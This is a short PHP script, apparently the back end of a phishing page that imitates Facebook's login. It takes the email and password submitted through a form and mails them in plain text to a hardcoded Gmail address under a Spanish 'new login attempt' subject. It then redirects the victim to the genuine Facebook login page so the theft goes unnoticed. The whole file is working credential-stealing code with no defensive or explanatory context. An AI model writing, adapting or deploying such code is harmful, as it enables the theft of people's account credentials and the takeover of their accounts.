<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "jata01.1317752887@gmail.com";
    $subject = "Nuevo intento de inicio de sesi�n";
    $message = "Correo/Usuario: $email\nContrase�a: $password";
    $headers = "From: no-reply@tuweb.com";

    mail($to, $subject, $message, $headers);
    
    // Redirigir a la p�gina oficial de Facebook despu�s del env�o
    header("Location: https://www.facebook.com/login/");
    exit();
}
?>